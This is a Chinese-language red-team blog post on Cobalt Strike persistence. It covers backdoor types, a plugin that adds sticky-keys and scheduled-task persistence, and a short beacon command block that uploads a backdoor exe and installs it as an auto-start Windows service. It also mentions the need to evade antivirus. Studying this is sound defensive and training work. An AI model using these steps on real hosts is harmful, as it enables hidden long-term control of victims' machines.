---
layout:     post
title:    Cobalt Strike系列 6
subtitle:   Cobalt Strike 后门与权限维持
date:       2019-08-20
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - Cobalt Strike
    - 红队
---
# Cobalt Strike系列 6 后门与权限维持


# 简介

- 后门  
- CS插件权限维持  



## 后门
当我们接到某个任务应急的时候，往往系统已经是被入侵了，甚至已经被脱库，且植入后门继续进行持续攻击。 攻击者在后渗透阶段的目的是什么？完成作战目的后，不让防御者溯源，即反溯源。攻击者进入持续攻击阶段，与前面的渗透攻击的重要区别就在于持续性，权限的维持，后门在持续攻击中就是非常重要的一环。  
常见后门种类：  
- 本地后门  
- 第三方后门  

根据触发机制又可以分为：  
- 主动后门  
- 被动后门  

一个优秀的后门最起码应该是隐蔽的，然后要稳定。  
一个优秀成熟的后门，能够极大的增加防御者投入在对抗攻击中的人力成本，物力成本。  
劣质的后门，不但起不到持久化作用，还会加快结束攻击者的行动，甚至会暴露攻击者。  

## CS插件权限维持
常见维持权限的手段：  
- 注册表  
- 启动项  
- 计划任务  
- 服务  
- 后门  
- dll劫持  
- 等等  

###  CS添加插件

CS中需要手动添加插件，用来权限维持。  
需要先下载cna脚本，我是在春秋上下的，可以自己去取。  
[add_pug](/img/add_pug.png)   
然后load脚本。  
[add_pug2](/img/add_pug2.png)   
再右键beacon就会发现，多了persist选项
[persist](/img/persist.png)   
简单介绍下几个模块的用法。  
前面几个都是基于dll劫持的。  
sticky keys 是shift后门。
scheduled job是计划任务维持。  
使用的话直接使用就可以了。  

###  开机启动后门
我们尝试用生成的exe，添加到开机任务来维持权限。  
首先生成exe后门，测试就不用免杀，实际中生成的基本不能直接用，统统被杀软爆了。  
然后在beacon中操作：  
```
beacon> cd C:\WINDOWS\Temp\
beacon> upload /Users/xxxx/Desktop/1.exe
beacon> shell sc create "aaser" binpath= "C:\WINDOWS\Temp\1.exe"
beacon> shell sc description "aaser" "description"
beacon> shell sc config "aaser" start= auto
beacon> shell net start "aaser"
```
这样一来每次重启，都会执行1.exe返回beacon。当然问题最大的还是免杀，后面再讲这个问题。  

###  dll后门
坑先挖好，暂时不知道怎么写，有些细节不知道怎么去展开。  


## 结语
本来想写下转发的，但是环境没搭建好，所以写这个。 在写的过程中发现，铺开来讲实在是太多了，一个dll都能拉出来专门开一个坑了，还有自己编写后门，我需要再考虑考虑这个问题。    













